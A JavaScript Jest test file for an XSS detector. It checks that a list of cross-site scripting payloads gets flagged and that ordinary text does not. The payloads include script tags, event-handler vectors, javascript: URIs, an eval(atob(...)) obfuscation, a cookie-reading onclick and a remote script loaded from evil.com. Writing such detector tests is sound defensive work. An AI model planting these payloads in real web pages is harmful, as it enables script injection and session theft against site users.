const XSSDetector = require('../src/detectors/XSSDetector');

function normalized(fields) {
  return { ip: '127.0.0.1', path: '/api/test', method: 'GET', fields };
}

describe('XSSDetector — true positives (should be flagged malicious)', () => {
  const attackPayloads = [
    ["<script>alert('XSS')</script>", 'classic script tag'],
    ["<script src=\"http://evil.com/x.js\"></script>", 'remote script inclusion'],
    ["<img src=x onerror=alert(1)>", 'img onerror vector'],
    ["<svg onload=alert(1)>", 'svg onload vector'],
    ["<body onload=alert('xss')>", 'body onload vector'],
    ["<iframe src=\"javascript:alert(1)\"></iframe>", 'iframe + javascript URI'],
    ["<a href=\"javascript:alert(1)\">click</a>", 'javascript: URI in href'],
    ["<div onclick=\"alert(document.cookie)\">click</div>", 'onclick + cookie theft'],
    ["<object data=\"data:text/html,<script>alert(1)</script>\">", 'object tag vector'],
    ["<embed src=\"javascript:alert(1)\">", 'embed tag vector'],
    ["<input onfocus=eval(atob('YWxlcnQoMSk=')) autofocus>", 'eval-based obfuscation'],
  ];

  test.each(attackPayloads)('flags payload: %s (%s)', (payload) => {
    const result = XSSDetector.scan(normalized({ 'body.comment': payload }));
    expect(result.malicious).toBe(true);
  });
});

describe('XSSDetector — true negatives (should NOT be flagged)', () => {
  const legitimateInputs = [
    ["Great product, 5 stars!", 'normal review'],
    ["5 < 10 and 10 > 5", 'ordinary math comparison using angle brackets'],
    ["Please contact us at support@example.com", 'email in a message'],
    ["I'll recommend this to my <family>", 'angle brackets used loosely, not a real tag'],
    ["The event starts on Monday", 'ordinary sentence containing the word "on"'],
    ["This is a well-onstructed argument", 'word starting with "on" but not an event handler'],
    ["", 'empty string'],
    ["Price dropped from $50 to $30", 'ordinary sentence, unrelated to markup'],
  ];

  test.each(legitimateInputs)('does NOT flag: %s (%s)', (value) => {
    const result = XSSDetector.scan(normalized({ 'body.comment': value }));
    expect(result.malicious).toBe(false);
  });
});

describe('XSSDetector — reports which field triggered it', () => {
  test('identifies the offending field name', () => {
    const result = XSSDetector.scan(
      normalized({
        'body.name': 'Jane Doe',
        'body.comment': "<script>alert(1)</script>",
      })
    );
    expect(result.malicious).toBe(true);
    expect(result.field).toBe('body.comment');
  });

  test('exposes testField() for the shared field-by-field detection path', () => {
    const matchedPattern = XSSDetector.testField("<script>alert(1)</script>");
    expect(matchedPattern).toBeTruthy();
  });
});